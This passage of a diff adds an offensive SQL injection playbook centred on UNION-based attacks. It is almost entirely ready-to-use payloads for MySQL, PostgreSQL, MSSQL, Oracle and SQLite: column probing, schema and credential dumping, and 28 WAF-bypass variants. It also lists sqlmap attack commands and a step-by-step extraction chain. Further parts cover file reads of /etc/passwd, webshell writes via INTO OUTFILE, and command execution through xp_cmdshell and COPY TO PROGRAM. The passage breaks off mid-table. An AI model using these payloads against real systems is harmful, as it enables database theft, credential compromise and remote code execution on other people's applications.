+-- Continue until all columns are discovered
+\`\`\`
+
+**MySQL -- Backtick Positional Reference:**
+
+\`\`\`sql
+-- [L4-17] Reference columns by number (no names needed)
+SELECT \`1\` FROM (SELECT 1,2,3,4 UNION SELECT * FROM users)x LIMIT 1,1
+-- \`1\` = first column, \`2\` = second column, etc.
+
+-- [L4-18] Practical extraction
+' UNION SELECT 1,(SELECT CONCAT(\`3\`,0x3a,\`4\`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM users)a LIMIT 1,1),3--
+\`\`\`
+
+**MySQL -- F.N Positional Reference:**
+
+\`\`\`sql
+-- [L4-19] Direct column position reference
+-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F--
+\`\`\`
+
+**UNION to RCE Per Database:**
+
+\`\`\`sql
+-- [L4-20] MySQL: write webshell
+' UNION SELECT '<?php system($_GET["c"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
+
+-- [L4-21] MSSQL: enable and run xp_cmdshell (requires stacked queries)
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';--
+
+-- [L4-22] PostgreSQL: COPY TO PROGRAM (superuser, PG >= 9.3)
+'; COPY (SELECT '') TO PROGRAM 'id > /tmp/output';--
+
+-- [L4-23] Oracle: DBMS_SCHEDULER
+'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'cmd',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>2,auto_drop=>TRUE); END;--
+
+-- [L4-24] SQLite: load_extension
+' UNION SELECT 1,load_extension('/path/to/evil.so','init'),3--
+\`\`\`
+
+### Level 5: Cutting-Edge Techniques
+
+**Routed SQL Injection (UNION Inside Subquery for Second-Order):**
+
+When the application uses the result of the first query as input to a second query, the UNION payload itself must contain a hex-encoded inner payload.
+
+\`\`\`sql
+-- [L5-01] Outer UNION injects hex-encoded inner UNION
+-1' UNION SELECT 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
+-- Hex decodes to: -1' union select login,password from users-- a
+-- The application takes the UNION result and passes it to a second query
+-- The hex-decoded inner payload executes in the second query context
+\`\`\`
+
+**JSON-Based WAF Bypass (Claroty Team82, 2022):**
+
+JSON functions create tautologies invisible to WAFs that do not parse JSON within SQL context. Bypassed Palo Alto, AWS WAF, Cloudflare, F5, and Imperva before patches.
+
+\`\`\`sql
+-- [L5-02] MySQL JSON tautology + UNION
+' OR JSON_EXTRACT('{"a":1}','$.a')=1 UNION SELECT 1,2,3 --
+
+-- [L5-03] PostgreSQL JSONB operator + UNION
+' OR '{"a":1}'::jsonb @> '{"a":1}'::jsonb UNION SELECT NULL,NULL,NULL --
+
+-- [L5-04] MSSQL ISJSON tautology + UNION
+' OR ISJSON('{"a":1}')=1 UNION SELECT 1,2,3 --
+
+-- [L5-05] SQLite json_extract + UNION
+' OR json_extract('{"a":1}','$.a')=1 UNION SELECT 1,2,3 --
+\`\`\`
+
+**Genetic Algorithm WAF Mutation:**
+
+Researchers applied genetic algorithms to automatically mutate UNION payloads until they bypass specific WAFs. Starting from a blocked payload, the algorithm mutates encoding, case, whitespace, and comments, tests against the WAF, selects surviving mutations, breeds them, and converges on a bypassing variant. Practical approximation via sqlmap tamper chaining:
+
+\`\`\`bash
+# [L5-06] Automated mutation via tamper scripts
+sqlmap -u "http://target/?id=1" \\
+  --tamper=randomcase,space2comment,between,charencode \\
+  --technique=U
+\`\`\`
+
+**Protocol-Level Smuggling:**
+
+\`\`\`
+# [L5-07] HTTP/2 pseudo-header injection (WAFs often fail on HTTP/2 binary framing)
+:path: /search?q=1+UNION+SELECT+1,2,3
+
+# [L5-08] Chunked transfer encoding (split payload across chunks)
+POST /search HTTP/1.1
+Transfer-Encoding: chunked
+
+7\\r\\nsearch=\\r\\n6\\r\\n1 UNI\\r\\n5\\r\\nON SE\\r\\n7\\r\\nLECT 1\\r\\n3\\r\\n,2,\\r\\n1\\r\\n3\\r\\n0\\r\\n\\r\\n
+
+# [L5-09] WebSocket frame injection (most WAFs skip WebSocket inspection)
+{"action":"search","query":"1 UNION SELECT 1,2,3"}
+\`\`\`
+
+**Prototype Pollution to SQLi (Node.js ORMs, 2024):**
+
+\`\`\`javascript
+// [L5-10] Pollute Object.prototype to inject UNION into ORM query builder
+Object.prototype.where = {"1 UNION SELECT 1,2,3--": "1"};
+// ORM incorporates polluted prototype into the SQL WHERE clause
+\`\`\`
+
+---
+
+## Tactics (MITRE ATT&CK)
+
+| Tactic | Technique ID | Technique Name | How UNION SQLi Maps |
+|--------|-------------|----------------|---------------------|
+| Reconnaissance | T1595.002 | Active Scanning: Vulnerability Scanning | Column count probing, injection point discovery |
+| Initial Access | T1190 | Exploit Public-Facing Application | Exploiting UNION SQLi in web application parameters |
+| Collection | T1005 | Data from Local System | Extracting files via LOAD_FILE/pg_read_file through UNION |
+| Collection | T1530 | Data from Cloud Storage Object | Extracting cloud credentials stored in database |
+| Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files | UNION + LOAD_FILE to read config files with DB passwords |
+| Credential Access | T1110 | Brute Force | Extracting password hashes via UNION for offline cracking |
+| Execution | T1059 | Command and Scripting Interpreter | UNION to RCE via xp_cmdshell, COPY TO PROGRAM, INTO OUTFILE |
+| Privilege Escalation | T1078 | Valid Accounts | Using extracted admin credentials to access higher-privilege areas |
+| Defense Evasion | T1027 | Obfuscated Files or Information | WAF bypass encoding, comment injection, case mutation |
+| Exfiltration | T1048 | Exfiltration Over Alternative Protocol | UNION + DNS exfil (LOAD_FILE to UNC, UTL_HTTP, dblink) |
+
+---
+
+## Tools
+
+### sqlmap -- Primary Automated Tool
+
+sqlmap is the standard tool for automated UNION-based extraction. The \`--technique=U\` flag restricts testing to UNION queries only.
+
+\`\`\`bash
+# [T01] Force UNION-only technique
+sqlmap -u "http://target/page?id=1" --technique=U
+
+# [T02] Specify column range to test (default 1-10, higher with --level)
+sqlmap -u "http://target/page?id=1" --technique=U --union-cols 1-20
+
+# [T03] Custom character instead of NULL for column probing
+sqlmap -u "http://target/page?id=1" --technique=U --union-char 123
+
+# [T04] Specify FROM table (required for Oracle: --union-from=DUAL)
+sqlmap -u "http://target/page?id=1" --technique=U --union-from=DUAL
+
+# [T05] Full UNION attack with all flags
+sqlmap -u "http://target/page?id=1" \\
+  --technique=U \\
+  --union-cols 1-15 \\
+  --union-char 999 \\
+  --union-from=information_schema.tables \\
+  --threads 5
+
+# [T06] UNION with WAF bypass tamper scripts
+sqlmap -u "http://target/page?id=1" \\
+  --technique=U \\
+  --tamper=randomcase,space2comment,between
+
+# [T07] UNION via POST data
+sqlmap -u "http://target/page" --data="id=1&submit=true" --technique=U
+
+# [T08] UNION via cookie injection
+sqlmap -u "http://target/page" --cookie="id=1*" --technique=U --level=2
+
+# [T09] Custom injection point marker
+sqlmap -u "http://target/search?q=test*" --technique=U
+
+# [T10] Dump specific table after UNION confirmation
+sqlmap -u "http://target/page?id=1" --technique=U -D targetdb -T users --dump
+\`\`\`
+
+**Key sqlmap tamper scripts for UNION bypass:**
+
+| Tamper | Effect |
+|--------|--------|
+| \`randomcase\` | \`uNiOn SeLeCt\` |
+| \`space2comment\` | \`UNION/**/SELECT\` |
+| \`between\` | Replaces \`=\` with \`NOT BETWEEN 0 AND\` |
+| \`charencode\` | URL-encodes characters |
+| \`chardoubleencode\` | Double URL-encodes characters |
+| \`space2hash\` | Replaces space with \`#\\n\` (MySQL) |
+| \`space2mssqlblank\` | Random whitespace characters (MSSQL) |
+| \`percentage\` | Inserts \`%\` into keywords (IIS/ASP) |
+
+### Other Tools
+
+| Tool | Use Case |
+|------|----------|
+| **Burp Suite Intruder** | Manual UNION column counting with position-based payloads |
+| **Burp Suite Repeater** | Iterative UNION payload crafting and response inspection |
+| **Hackbar (browser extension)** | Quick payload encoding and injection in URL bar |
+| **CyberChef** | Hex/URL/base64 encoding for quote-free and WAF bypass payloads |
+| **Ghauri** | sqlmap alternative focused on WAF bypass for UNION/error-based |
+
+---
+
+## Payload Crafting
+
+### Column Count Determination (10 payloads)
+
+\`\`\`sql
+-- [CC-01] ORDER BY incremental (all DBs)
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+-- Continue until error reveals column count
+
+-- [CC-02] UNION SELECT NULL incremental (all DBs)
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+-- Success = correct column count
+
+-- [CC-03] Oracle UNION SELECT NULL with DUAL
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT NULL,NULL FROM DUAL--
+' UNION SELECT NULL,NULL,NULL FROM DUAL--
+
+-- [CC-04] MySQL comment terminators
+' UNION SELECT NULL,NULL,NULL#
+' UNION SELECT NULL,NULL,NULL-- -
+
+-- [CC-05] GROUP BY alternative (all DBs)
+' GROUP BY 1--
+' GROUP BY 2--
+' GROUP BY 3--
+
+-- [CC-06] MySQL LIMIT INTO
+1' LIMIT 1,1 INTO @--+
+1' LIMIT 1,1 INTO @,@--+
+1' LIMIT 1,1 INTO @,@,@--+
+
+-- [CC-07] MSSQL HAVING error (reveals column names)
+' HAVING 1=1--
+' GROUP BY table.column1 HAVING 1=1--
+
+-- [CC-08] Bulk ORDER BY (MySQL)
+' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+
+-- [CC-09] Integer marker test (all DBs)
+' UNION SELECT 1,2,3,4,5--
+-- Whichever number appears on the page = visible column position
+
+-- [CC-10] Mixed type test
+' UNION SELECT 'A','B',3,4,5--
+-- Columns returning A/B are text; columns with type error are numeric
+\`\`\`
+
+### Text Column Identification (10 payloads)
+
+\`\`\`sql
+-- [TC-01] Single quote string per position (3-column example)
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+
+-- [TC-02] Oracle with DUAL
+' UNION SELECT 'a',NULL,NULL FROM DUAL--
+' UNION SELECT NULL,'a',NULL FROM DUAL--
+' UNION SELECT NULL,NULL,'a' FROM DUAL--
+
+-- [TC-03] Verify with known strings
+' UNION SELECT 'GORGE_TEST','GORGE_TEST',NULL--
+
+-- [TC-04] MySQL hash comment
+' UNION SELECT 'a',NULL,NULL#
+
+-- [TC-05] Integer plus string mix (4-column)
+' UNION SELECT 1,'test',3,4--
+
+-- [TC-06] Hex string instead of quoted (WAF bypass)
+' UNION SELECT 0x474f524745,NULL,NULL--
+-- 0x474f524745 = 'GORGE'
+
+-- [TC-07] CHAR function (no quotes needed)
+' UNION SELECT CHAR(71,79,82,71,69),NULL,NULL--
+
+-- [TC-08] PostgreSQL type cast
+' UNION SELECT NULL::text,'test'::text,NULL::int--
+
+-- [TC-09] MSSQL CAST
+' UNION SELECT CAST('test' AS VARCHAR(100)),NULL,NULL--
+
+-- [TC-10] Force empty original result + string marker
+-1' UNION SELECT 'VISIBLE_COL1','VISIBLE_COL2','VISIBLE_COL3'--
+\`\`\`
+
+### MySQL Extraction (15 payloads)
+
+\`\`\`sql
+-- [MY-01] Version, user, database in one shot
+' UNION SELECT database(),user(),version()--
+
+-- [MY-02] System variables
+' UNION SELECT @@datadir,@@hostname,@@port--
+
+-- [MY-03] List all databases
+' UNION SELECT GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata--
+
+-- [MY-04] List all databases with hex separators (quote-free)
+' UNION SELECT GROUP_CONCAT(0x7c,schema_name,0x7c),NULL FROM information_schema.schemata--
+
+-- [MY-05] List tables in current database
+' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- [MY-06] List tables with hex-encoded db name (no quotes)
+' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=0x7461726765746462--
+
+-- [MY-07] List columns for target table
+' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
+
+-- [MY-08] Extract credentials with line separators
+' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL FROM users--
+
+-- [MY-09] Row-by-row extraction
+' UNION SELECT username,password FROM users LIMIT 0,1--
+' UNION SELECT username,password FROM users LIMIT 1,1--
+
+-- [MY-10] Read file from disk
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+
+-- [MY-11] Read file with hex path (quote-free)
+' UNION SELECT LOAD_FILE(0x2f6574632f706173737764),NULL--
+
+-- [MY-12] Write webshell
+' UNION SELECT '<?php system($_GET["c"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
+
+-- [MY-13] Alternative schema source (WAF bypass for information_schema)
+' UNION SELECT table_name,NULL FROM mysql.innodb_table_stats WHERE database_name=database()--
+
+-- [MY-14] JSON aggregation (MySQL 5.7+)
+' UNION SELECT JSON_ARRAYAGG(CONCAT(table_name)),NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- [MY-15] Full schema.table.column dump
+' UNION SELECT GROUP_CONCAT(table_schema,0x2e,table_name,0x2e,column_name SEPARATOR 0x0a),NULL FROM information_schema.columns--
+\`\`\`
+
+### PostgreSQL Extraction (15 payloads)
+
+\`\`\`sql
+-- [PG-01] Version, database, user
+' UNION SELECT version(),current_database(),current_user--
+
+-- [PG-02] List all databases
+' UNION SELECT STRING_AGG(datname,','),NULL,NULL FROM pg_database--
+
+-- [PG-03] List schemas
+' UNION SELECT STRING_AGG(schema_name,','),NULL FROM information_schema.schemata--
+
+-- [PG-04] List tables via information_schema
+' UNION SELECT STRING_AGG(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'--
+
+-- [PG-05] List tables via pg_tables
+' UNION SELECT STRING_AGG(tablename,','),NULL FROM pg_tables WHERE schemaname='public'--
+
+-- [PG-06] List columns with data types
+' UNION SELECT STRING_AGG(column_name||':'||data_type,','),NULL FROM information_schema.columns WHERE table_name='users'--
+
+-- [PG-07] Extract credentials
+' UNION SELECT username||':'||password,NULL FROM users--
+
+-- [PG-08] Aggregate all rows
+' UNION SELECT STRING_AGG(username||':'||password, E'\\n'),NULL FROM users--
+
+-- [PG-09] Array aggregation
+' UNION SELECT array_to_string(array_agg(username||':'||password), E'\\n'),NULL FROM users--
+
+-- [PG-10] Read file (superuser)
+' UNION SELECT pg_read_file('/etc/passwd',0,1000),NULL--
+
+-- [PG-11] Read binary file as base64
+' UNION SELECT encode(pg_read_binary_file('/etc/passwd'),'base64'),NULL--
+
+-- [PG-12] Dollar-quoted strings (avoid single quotes)
+' UNION SELECT $$test$$,NULL--
+
+-- [PG-13] Database size fingerprint
+' UNION SELECT pg_database_size(current_database())::text,NULL--
+
+-- [PG-14] pg_catalog enumeration (bypasses information_schema blocks)
+' UNION SELECT STRING_AGG(attname,','),NULL FROM pg_catalog.pg_attribute a JOIN pg_catalog.pg_class c ON a.attrelid=c.oid WHERE c.relname='users' AND a.attnum > 0--
+
+-- [PG-15] Session info
+' UNION SELECT session_user||':'||inet_client_addr()::text,NULL--
+\`\`\`
+
+### MSSQL Extraction (15 payloads)
+
+\`\`\`sql
+-- [MS-01] Version, database, user
+' UNION SELECT @@version,db_name(),system_user--
+
+-- [MS-02] Hostname and login info
+' UNION SELECT host_name(),original_login(),session_user--
+
+-- [MS-03] List databases (legacy)
+' UNION SELECT name,NULL FROM master..sysdatabases--
+
+-- [MS-04] List databases by index
+' UNION SELECT DB_NAME(0),NULL--
+' UNION SELECT DB_NAME(1),NULL--
+
+-- [MS-05] Aggregate database names (2017+)
+' UNION SELECT STRING_AGG(name,','),NULL FROM master.sys.databases--
+
+-- [MS-06] List tables via sysobjects
+' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
+
+-- [MS-07] List tables via information_schema
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+-- [MS-08] List columns via syscolumns
+' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('users')--
+
+-- [MS-09] Column name by index
+' UNION SELECT COL_NAME(OBJECT_ID('users'),1),NULL--
+' UNION SELECT COL_NAME(OBJECT_ID('users'),2),NULL--
+
+-- [MS-10] Extract credentials
+' UNION SELECT username+':'+password,NULL FROM users--
+
+-- [MS-11] CAST for type conversion
+' UNION SELECT CAST(password AS VARCHAR(MAX)),NULL FROM users WHERE username='admin'--
+
+-- [MS-12] FOR XML PATH aggregation (all versions)
+' UNION SELECT STUFF((SELECT ','+username+':'+password FROM users FOR XML PATH('')),1,1,''),NULL--
+
+-- [MS-13] STRING_AGG aggregation (2017+)
+' UNION SELECT STRING_AGG(username+':'+password,CHAR(10)),NULL FROM users--
+
+-- [MS-14] Read file via OPENROWSET
+' UNION SELECT (SELECT x FROM OPENROWSET(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),NULL--
+
+-- [MS-15] Linked server enumeration
+' UNION SELECT STRING_AGG(name,','),NULL FROM sys.servers--
+\`\`\`
+
+### Oracle Extraction (15 payloads)
+
+\`\`\`sql
+-- [OR-01] Version detection
+' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--
+
+-- [OR-02] Current user
+' UNION SELECT user,NULL FROM dual--
+
+-- [OR-03] Database name
+' UNION SELECT name,NULL FROM v$database--
+
+-- [OR-04] List all schema owners
+' UNION SELECT DISTINCT owner,NULL FROM all_tables--
+
+-- [OR-05] List all tables
+' UNION SELECT table_name,NULL FROM all_tables--
+
+-- [OR-06] List tables for specific owner
+' UNION SELECT table_name,NULL FROM all_tables WHERE owner='TARGETSCHEMA'--
+
+-- [OR-07] Find tables with password columns
+' UNION SELECT owner||'.'||table_name,NULL FROM all_tab_columns WHERE column_name LIKE '%PASS%'--
+
+-- [OR-08] List columns for target table
+' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name='USERS'--
+
+-- [OR-09] Extract credentials with concatenation
+' UNION SELECT username||':'||password,NULL FROM users--
+
+-- [OR-10] Extract with CHR separator (no quoted delimiter)
+' UNION SELECT username||CHR(58)||password,NULL FROM users--
+
+-- [OR-11] LISTAGG aggregation (11g+)
+' UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL FROM all_tables WHERE owner=USER--
+
+-- [OR-12] XMLAGG aggregation (all versions, no length limit)
+' UNION SELECT rtrim(xmlagg(xmlelement(e,table_name||',')).extract('//text()'),','),NULL FROM all_tables--
+
+-- [OR-13] Paginated extraction via ROWNUM
+' UNION SELECT username,NULL FROM (SELECT ROWNUM r,username FROM all_users ORDER BY username) WHERE r=1--
+
+-- [OR-14] All user privileges
+' UNION SELECT LISTAGG(privilege,',') WITHIN GROUP (ORDER BY privilege),NULL FROM session_privs--
+
+-- [OR-15] Read file via HTTPURITYPE
+' UNION SELECT HTTPURITYPE('file:///etc/passwd').getclob(),NULL FROM DUAL--
+\`\`\`
+
+### SQLite Extraction (10 payloads)
+
+\`\`\`sql
+-- [SL-01] Version
+' UNION SELECT sqlite_version(),NULL--
+
+-- [SL-02] List all tables
+' UNION SELECT group_concat(tbl_name),NULL FROM sqlite_master WHERE type='table'--
+
+-- [SL-03] List tables excluding system
+' UNION SELECT group_concat(tbl_name),NULL FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'--
+
+-- [SL-04] Get CREATE TABLE statements (reveals columns)
+' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND tbl_name='users'--
+
+-- [SL-05] All CREATE statements aggregated
+' UNION SELECT group_concat(sql,char(10)),NULL FROM sqlite_master WHERE type='table'--
+
+-- [SL-06] Column names via PRAGMA
+' UNION SELECT group_concat(name),NULL FROM pragma_table_info('users')--
+
+-- [SL-07] Extract credentials
+' UNION SELECT username||':'||password,NULL FROM users--
+
+-- [SL-08] Aggregate all rows
+' UNION SELECT group_concat(username||':'||password,char(10)),NULL FROM users--
+
+-- [SL-09] Using sqlite_schema (3.33+)
+' UNION SELECT group_concat(tbl_name),NULL FROM sqlite_schema WHERE type='table'--
+
+-- [SL-10] JSON schema dump (3.38+)
+' UNION SELECT JSON_GROUP_ARRAY(JSON_OBJECT('table',tbl_name,'schema',sql)),NULL FROM sqlite_master WHERE type='table'--
+\`\`\`
+
+### WAF Evasion (28 payloads)
+
+\`\`\`sql
+-- [WF-01] Inline comment insertion
+UN/**/ION SEL/**/ECT 1,2,3
+
+-- [WF-02] MySQL version-conditional comments
+/*!50000UNION*/ /*!50000SELECT*/ 1,2,3
+
+-- [WF-03] Version 0 (always execute)
+/*!00000UNION*/ /*!00000SELECT*/ 1,2,3
+
+-- [WF-04] Case variation
+uNiOn SeLeCt 1,2,3
+
+-- [WF-05] Tab whitespace (%09)
+UNION%09SELECT%091,2,3
+
+-- [WF-06] Newline whitespace (%0a)
+UNION%0ASELECT%0A1,2,3
+
+-- [WF-07] Carriage return (%0d)
+UNION%0DSELECT%0D1,2,3
+
+-- [WF-08] Non-breaking space (%a0, MySQL-specific)
+UNION%A0SELECT%A01,2,3
+
+-- [WF-09] Parentheses as separators (no spaces)
+UNION(SELECT(1),(2),(3))
+
+-- [WF-10] Scientific notation space bypass (MySQL)
+0e0UNION SELECT 1,2,3
+1.0UNION SELECT 1,2,3
+
+-- [WF-11] Keyword doubling (strips once -> valid SQL)
+UNUNIONION SESELECTLECT 1,2,3
+
+-- [WF-12] Partial URL encoding
+%55nion %53elect 1,2,3
+
+-- [WF-13] Double URL encoding
+%2555NION %2553ELECT 1,2,3
+
+-- [WF-14] Hex-encoded strings (no quotes)
+UNION SELECT 0x61646d696e,0x70617373776f7264
+
+-- [WF-15] DISTINCT/ALL between UNION and SELECT
+' UNION DISTINCT SELECT 1,2,3--
+' UNION ALL SELECT 1,2,3--
+
+-- [WF-16] Hash comment + newline (MySQL)
+UNION%23foo%0ASELECT 1,2,3
+
+-- [WF-17] Comment-as-space with long padding
+UNION/*AAAAAAAAAAAAAAAAAAAAA*/SELECT 1,2,3
+
+-- [WF-18] JSON tautology prefix (Claroty bypass)
+' OR JSON_EXTRACT('{"a":1}','$.a')=1 UNION SELECT 1,2,3 --
+
+-- [WF-19] XML entity encoding (in XML/SOAP contexts)
+&#x55;NION &#x53;ELECT 1,2,3
+
+-- [WF-20] Unicode fullwidth characters
+%EF%BC%B5NION %EF%BC%B3ELECT 1,2,3
+
+-- [WF-21] Wide byte injection (GBK charset)
+%bf' UNION SELECT 1,2,3--
+
+-- [WF-22] HTTP parameter pollution (split payload)
+?id=1 UNION/*&id=*/SELECT 1,2,3
+
+-- [WF-23] Chunked transfer encoding (split across chunks)
+-- Send payload split across Transfer-Encoding: chunked body
+
+-- [WF-24] Multipart/form-data boundary abuse
+-- Embed payload in multipart boundary with long/unusual boundary string
+
+-- [WF-25] Buffer overflow the WAF (8KB+ junk prefix)
+?junk=AAAA...(8000 chars)...&id=1 UNION SELECT 1,2,3
+
+-- [WF-26] IIS/ASP character contamination
+id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
+
+-- [WF-27] Content-Type confusion
+-- Send as text/plain instead of application/x-www-form-urlencoded
+
+-- [WF-28] HTTP method change (PUT/PATCH instead of GET/POST)
+-- Some WAFs only inspect GET/POST bodies
+\`\`\`
+
+### DIOS Payloads (5 -- one per database)
+
+\`\`\`sql
+-- [DIOS-01] MySQL DIOS
+' UNION SELECT 1,(SELECT GROUP_CONCAT(CONCAT_WS(0x3a3a,table_schema,table_name,column_name) SEPARATOR 0x3c62723e) FROM information_schema.columns WHERE table_schema!=0x696E666F726D6174696F6E5F736368656D61),3--
+
+-- [DIOS-02] PostgreSQL DIOS
+' UNION SELECT NULL,(SELECT STRING_AGG(table_schema||'.'||table_name||'.'||column_name,E'\\n') FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema')),NULL--
+
+-- [DIOS-03] MSSQL DIOS
+' UNION SELECT NULL,(SELECT STUFF((SELECT CHAR(10)+TABLE_SCHEMA+'.'+TABLE_NAME+'.'+COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS FOR XML PATH('')),1,1,'')),NULL--
+
+-- [DIOS-04] Oracle DIOS
+' UNION SELECT NULL,(SELECT LISTAGG(owner||'.'||table_name||'.'||column_name,CHR(10)) WITHIN GROUP(ORDER BY owner,table_name) FROM all_tab_columns WHERE owner NOT IN ('SYS','SYSTEM')),NULL FROM DUAL--
+
+-- [DIOS-05] SQLite DIOS
+' UNION SELECT 1,(SELECT GROUP_CONCAT(sql,CHAR(10)||CHAR(10)) FROM sqlite_master WHERE type='table'),3--
+\`\`\`
+
+### Comma-Free and Column-Name-Free (5 payloads)
+
+\`\`\`sql
+-- [CF-01] Comma-free UNION via JOIN (3 columns)
+' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
+
+-- [CF-02] Comma-free data extraction
+' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())b JOIN (SELECT 3)c--
+
+-- [CF-03] Column-name-free: self-JOIN error enumeration (MySQL)
+' UNION SELECT * FROM (SELECT * FROM users JOIN users b)a--
+
+-- [CF-04] Column-name-free: backtick positional extraction (MySQL)
+' UNION SELECT 1,(SELECT \`3\` FROM (SELECT 1,2,3,4 UNION SELECT * FROM users)x LIMIT 1,1),3--
+
+-- [CF-05] Comma-free LIMIT (OFFSET syntax)
+' UNION SELECT username FROM users LIMIT 1 OFFSET 0--
+\`\`\`
+
+---
+
+## Exploitation
+
+### 10-Step UNION Extraction Chain
+
+**Step 1: Confirm injection point.**
+
+\`\`\`
+/products?category=Gifts'          --> error confirms injection
+/products?category=Gifts' AND '1'='1  --> normal page confirms string context
+\`\`\`
+
+**Step 2: Determine column count.**
+
+\`\`\`sql
+' ORDER BY 1-- -         -- OK
+' ORDER BY 2-- -         -- OK
+' ORDER BY 3-- -         -- OK
+' ORDER BY 4-- -         -- ERROR -> 3 columns
+\`\`\`
+
+**Step 3: Identify visible text columns.**
+
+\`\`\`sql
+' UNION SELECT 'AAA','BBB','CCC'-- -
+-- 'BBB' appears on page -> column 2 is visible
+\`\`\`
+
+**Step 4: Fingerprint the database.**
+
+\`\`\`sql
+' UNION SELECT NULL,version(),NULL-- -
+-- Response: "PostgreSQL 14.2 on x86_64-pc-linux-gnu"
+\`\`\`
+
+**Step 5: List all databases.**
+
+\`\`\`sql
+' UNION SELECT NULL,STRING_AGG(datname,','),NULL FROM pg_database-- -
+-- Response: "postgres,targetapp,template0,template1"
+\`\`\`
+
+**Step 6: List tables in target database.**
+
+\`\`\`sql
+' UNION SELECT NULL,STRING_AGG(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'-- -
+-- Response: "users,orders,sessions,products,api_keys"
+\`\`\`
+
+**Step 7: List columns in target table.**
+
+\`\`\`sql
+' UNION SELECT NULL,STRING_AGG(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'-- -
+-- Response: "id,username,password,email,role,created_at"
+\`\`\`
+
+**Step 8: Extract credentials.**
+
+\`\`\`sql
+' UNION SELECT NULL,STRING_AGG(username||':'||password, E'\\n'),NULL FROM users-- -
+-- Response:
+-- admin:$2b$12$LJ3m4ys3...
+-- john:$2b$12$Kp9x8zB...
+-- alice:$2b$12$Nm3q7wR...
+\`\`\`
+
+**Step 9: Extract high-value targets (API keys, session tokens).**
+
+\`\`\`sql
+' UNION SELECT NULL,STRING_AGG(key_name||':'||key_value, E'\\n'),NULL FROM api_keys-- -
+\`\`\`
+
+**Step 10: Escalate if privileges allow.**
+
+\`\`\`sql
+-- Attempt file read (requires superuser or pg_read_server_files)
+' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL-- -
+
+-- Attempt RCE (requires superuser)
+'; COPY (SELECT '') TO PROGRAM 'id > /tmp/output';-- -
+\`\`\`
+
+---
+
+## Post-Exploitation
+
+### DIOS for Complete Schema Acquisition
+
+After confirming UNION injection, deploy the appropriate DIOS payload to retrieve the full database schema in a single request. See the DIOS subsection under Level 4 Techniques for per-database payloads.
+
+### File Read Per Database
+
+| Database | Function | Requirement | Payload |
+|----------|----------|-------------|---------|
+| MySQL | \`LOAD_FILE()\` | FILE privilege, secure_file_priv allows | \`UNION SELECT LOAD_FILE('/etc/passwd'),NULL--\` |
+| MySQL | \`LOAD_FILE()\` hex path | FILE privilege | \`UNION SELECT LOAD_FILE(0x2f6574632f706173737764),NULL--\` |
+| PostgreSQL | \`pg_read_file()\` | Superuser or pg_read_server_files | \`UNION SELECT pg_read_file('/etc/passwd'),NULL--\` |
+| PostgreSQL | \`lo_import()+lo_get()\` | CREATE privilege | \`UNION SELECT lo_get(lo_import('/etc/passwd'))::text,NULL--\` |
+| MSSQL | \`OPENROWSET BULK\` | Ad hoc distributed queries enabled | \`UNION SELECT (SELECT x FROM OPENROWSET(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),NULL--\` |
+| Oracle | \`HTTPURITYPE\` | Network access | \`UNION SELECT HTTPURITYPE('file:///etc/passwd').getclob(),NULL FROM DUAL--\` |
+| Oracle | \`XMLType XXE\` | XML processing | \`UNION SELECT EXTRACTVALUE(XMLType('<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'),'/r'),NULL FROM DUAL--\` |
+
+### File Write Per Database
+
+| Database | Method | Requirement | Payload |
+|----------|--------|-------------|---------|
+| MySQL | \`INTO OUTFILE\` | FILE privilege, writable path | \`UNION SELECT 'shell',NULL INTO OUTFILE '/var/www/html/shell.php'--\` |
+| MySQL | \`INTO DUMPFILE\` | FILE privilege | \`UNION SELECT 0x3C3F706870...,NULL INTO DUMPFILE '/path/shell.php'--\` |
